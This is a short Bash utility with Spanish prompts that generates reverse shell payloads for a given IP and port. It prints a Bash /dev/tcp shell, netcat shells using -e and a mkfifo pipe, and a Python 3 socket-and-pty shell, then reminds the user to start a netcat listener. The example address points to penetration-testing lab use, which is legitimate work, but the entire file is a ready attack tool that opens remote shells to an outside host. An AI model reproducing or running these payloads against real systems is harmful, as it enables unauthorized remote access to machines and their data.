#!/bin/bash
IP=$1
PUERTO=$2

if [ -z "$IP" ] || [ -z "$PUERTO" ]; then
  echo -e "\n[!] Uso: revshell <TU_IP> <PUERTO>"
  echo -e "Ejemplo: revshell 10.10.14.5 4444\n"
  exit 1
fi

echo -e "\n[+] Generando Reverse Shells para $IP:$PUERTO\n"

echo "=== BASH ==="
echo "bash -c 'bash -i >& /dev/tcp/$IP/$PUERTO 0>&1'"
echo ""

echo "=== NETCAT (Clásico) ==="
echo "nc -e /bin/sh $IP $PUERTO"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PUERTO >/tmp/f"
echo ""

echo "=== PYTHON 3 ==="
echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PUERTO));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
echo ""

echo "[+] Recuerda ponerte en escucha: nc -nlvp $PUERTO"